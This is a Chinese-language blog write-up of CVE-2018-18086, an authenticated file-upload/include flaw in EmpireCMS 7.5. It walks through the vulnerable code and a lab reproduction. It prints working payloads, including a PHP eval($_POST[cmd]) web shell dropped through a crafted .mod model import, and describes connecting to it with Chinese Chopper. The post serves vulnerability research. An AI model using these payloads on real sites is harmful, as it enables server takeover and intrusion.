# 帝国 CMS(EmpireCMS) v7.5 后台 getshell 分析(CVE-2018-18086) - 雨中落叶 - 博客园

> 原文：[`www.cnblogs.com/yuzly/p/11359925.html`](https://www.cnblogs.com/yuzly/p/11359925.html)

帝国 CMS(EmpireCMS) v7.5 后台 getshell 分析(CVE-2018-18086)

**一、漏洞描述**

EmpireCMS 7.5 版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。EmpireCMS7.5 版本中的/e/class/moddofun.php 文件的”LoadInMod”函数存在安全漏洞,攻击者可利用该漏洞上传任意文件。

**二、影响版本**

EmpireCMS<=7.5

**三、环境搭建**

1、官方下载 EmpireCMS V7.5 下载地址:http://www.phome.net/download/

2、把下载的文件中的 upload 下的所有目录和文件放入到网站根目录下

3、修改 php.ini 配置文件, PHP 环境中必须开启短标签,不然安装会提示无法安装

　　![](img/a4bdc06e021b5d3bcab8c13006a99851.png)

4、设置 php.ini 中 short_open_tag = On,重启 phpstudy

　　![](img/d3c9b8a8619e840bfdf5f596bf3f1a8b.png)

5、然后开始安装,安装过程参考: https://jingyan.baidu.com/article/48b37f8dcc014b1a6564887c.html

**四、漏洞复现**

1、查看/e/admin/ecmsmod.php 代码

　　![](img/92523645c9b55d9211c7151aacfd01d4.png)

2、跟随 LoadInMod 函数来到/e/class/moddofun.php,可以看到上传文件处使用 make_password(10)对时间进行加密然后拼接成为上传的文件名,这样就无法得到用户名

　　![](img/bd5e3620a8167c3da9c07f96b5b34791.png)

3、继续浏览代码,在下面发现@include($path),直接包含了这个上传的文件,这时如果在上传文件中添加可以创建文件的代码就可以绕过找不到文件名这个限制了。

　　![](img/2d6005fba12520db1efa99915354e5ff.png)

4、我们可以构造如下 payload:

<?php file_put_contents(“shell.php”,”<?php phpinfo(); ?>”); ?>

5、登录后台,点击如下图所示

　　![](img/955a3376ce0e103621339f42cf98252d.png)

6、点击”导入系统模型”之后进入如下界面

　　![](img/712e7f26966aa98a121b93442f7ec117.png)

7、可以上传一个内容为 php 代码的”.mod”后缀的文件,内容如下:

　　![](img/ce7f5c2806dc6815028d890889d47461.png)

8、上传 1.php.mod 文件

　　![](img/15a5cd7c06b9f7ce8cf4aed9386af853.png)

9、查看文件,可以看到成功上传

　　![](img/fc744c646a969c1a0694be657d88cbf0.png)

10、浏览访问 http://192.168.10.171/empirecms/e/admin/shell.php,可以看到成功执行代码

　　![](img/fc906730735a00f00f2cfcf6f5229a05.png)

11、上传一个内容可以 getshell 的 1.php.mod,内容入下:注意需要对$进行转义

<?php file_put_contents("caidao.php","<?php @eval(\$_POST[cmd]); ?>");?>

12、成功上传后,菜刀连接,成功 getshell

　　![](img/3ab081508bd22dd3f55287fb59cc9e2d.png)

------------------------------------------------------------------------------------------

参考: https://github.com/SukaraLin/php_code_audit_project/issues/1